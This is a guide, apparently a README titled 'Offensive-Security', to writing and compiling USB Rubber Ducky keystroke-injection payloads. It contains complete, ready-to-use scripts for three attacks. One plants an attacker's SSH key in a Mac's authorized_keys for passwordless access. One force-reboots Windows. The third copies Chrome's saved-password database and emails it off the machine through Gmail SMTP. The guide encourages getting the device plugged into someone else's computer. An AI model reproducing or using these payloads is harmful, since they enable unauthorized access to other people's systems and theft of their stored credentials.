# **Offensive-Security**

## **1. OSX Passwordless SSH access**

### **Step 1: Download the Duck Encoder**

In order to create Rubber Ducky payloads, we need to have the duck encoder installed. This is a program that takes our ducky script and converts it into  a cross-platform inject.bin file that the keyboard adapter will use to deliver our keystroke payload.

You can download the duck encoder here: https://github.com/hak5darren/USB-Rubber-Ducky/blob/master/duckencoder.jar

### **Step 2: Insert the microSD card into your computer**

If you don’t want to run the payload on your own computer, make sure you swap the microSD card out of the keyboard adapter and into the smaller plastic microSD-to-USB adapter that they provide. This will allow it to mount to your system as a regular USB storage device.

### **Step 3: Create payload using Ducky Script**

The syntax is very simple, the most important ones are:

* **REM**: allows you to add comments to the program to leave notes to yourself that the program won’t execute
* **STRING**: will type the remainder of the line exactly as-is into the target computer
* **ENTER** or **SPACE**: will hit the “enter” or “space” keys, pretty straightforward
* **DELAY**: instructs the program to wait a number of milliseconds before continuing
* **GUI**: is like pressing the cmd key on a Mac or the Windows Key on a PC. You’ll commonly see GUI SPACE to open the spotlight search on payloads for Macs, or GUI r to open the “Run” dialogue box on payloads meant for Windows systems

#### Payload Ducky Script for passwordless ssh access:
```
DELAY 1000
COMMAND SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 800
STRING echo 'RSA_PUB_ID' >> ~/.ssh/authorized_keys
ENTER
DELAY 1000
STRING killall Terminal
ENTER
```
>* **Replace RSA_PUB_ID with your SSH Public Key.**
### **Step 4: Compile Ducky Script into an inject.bin**

After writing the ducky script, we need to compile it and transfer it ot microSD card.

In order to compile it, simply run:
```
java -jar ~/$pathToDecoder$/duckencoder.jar  -i ~/$pathToScript$/$scriptName$.txt -o /$outputPath$\ NAME/inject.bin
```

When this command runs, you should see output like:
```
Hak5 Duck Encoder 2.6.3

Loading File .....    [ OK ]
Loading Keyboard File ..... [ OK ]
Loading Language File ..... [ OK ]
Loading DuckyScript ..... [ OK ]
DuckyScript Complete..... [ OK ]
```
If so, you’re done! Your ducky script has been compiled and transferred to the microSD card.

### **Step 5: Plug in the USB Rubber Ducky to Host**

This is the most important step, you have to find you way to plug in this USB to Host computer :)

## **2. Reboot System**
The same step as OSX Passwordless SSH access. Simply replace the ducky script:
```
DELAY 2000
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 100
STRING reboot
DELAY 100
ENTER
```

## **3. Chrome Password Stealer**
This only works for windows! This script will steal the local password for chrome in about 10 sec and send it to your preferred gmail. You can change delays for slower computers. You can also delete the the GUI L in the end, that only locks the computer in the end of the script.
```
DELAY 1000
GUI R
DELAY 100
STRING powershell
DELAY 10
ENTER
DELAY 300
STRING copy "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" "Desktop"
DELAY 10
ENTER
DELAY 10
Y
DELAY 10
ENTER
DELAY 10
STRING $SMTPServer = 'smtp.gmail.com'
DELAY 20
ENTER
DELAY 30
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
DELAY 20
ENTER
DELAY 30
STRING $SMTPInfo.EnableSsl = $true
DELAY 20
ENTER
DELAY 30
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('your gmail', 'Your gmail password')
DELAY 20
ENTER
DELAY 30
STRING $E = New-Object System.Net.Mail.MailMessage
DELAY 20
ENTER
DELAY 30
STRING $E.From = 'your gmail'
DELAY 20
ENTER
DELAY 30
STRING $E.To.Add('your gmail')
DELAY 20
ENTER
DELAY 30
STRING $E.Subject = $env:UserName
DELAY 20
ENTER
DELAY 30
STRING $E.Body = 'C pswd'
DELAY 20
ENTER
DELAY 30
STRING $F = "Desktop\login data"
DELAY 20
ENTER
DELAY 30
STRING $E.Attachments.Add($F)
DELAY 20
ENTER
DELAY 30
STRING $SMTPInfo.Send($E)
DELAY 20
ENTER
DELAY 50
STRING exit
DELAY 10
ENTER
DELAY 50
GUI L
```

## **4. Toolkit**

Here is a website that can help encode the script. Also it can help decode the inject.bin which may help to learn others script.
https://ducktoolkit.com/